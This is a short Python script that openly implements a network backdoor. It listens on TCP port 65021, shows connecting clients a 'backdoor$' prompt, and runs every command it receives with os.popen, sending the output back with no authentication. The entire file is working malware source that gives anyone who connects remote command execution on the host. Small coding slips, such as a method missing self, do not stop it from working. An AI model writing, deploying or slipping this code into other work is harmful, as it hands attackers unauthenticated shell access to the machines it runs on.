import os
import socket

def formatString(s):
    s = s.decode().strip()
    if s.endswith("\x00"):
        s = s[:-2]
    return s

def getIP():
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.connect(("8.8.8.8", 80))
    ipaddress = sock.getsockname()[0]
    sock.close()
    return ipaddress

class backdoor():
	def __init__(self):
		#Port for backdoor to listen on
		self.LPORT = 65021
		self.LHOST = getIP()
		self.sock = socket.socket(
            socket.AF_INET, socket.SOCK_STREAM
		)  # TCP socket object
	def bind(self):
		self.sock.bind((self.LHOST, self.LPORT))

	def execCommand(command, connection, clientAddress):
		fCommand = formatString(command)
		response = os.popen(fCommand).read()
		connection.sendto(b"[*] "+response.encode(), clientAddress)

	def listen(self):
		try:
			self.sock.listen(5)
			connection, clientAddress = self.sock.accept()
			while True:
				connection.sendto(b"backdoor$ ",clientAddress)
				command = connection.recv(1024)
				backdoor.execCommand(command, connection, clientAddress)
		except (BrokenPipeError, ConnectionAbortedError, ConnectionResetError):
			return
		except UnicodeDecodeError:  # Telnet Error ???
			return
if __name__ == "__main__":
	b = backdoor()
	backdoor.bind(b)
	while True:
		backdoor.listen(b)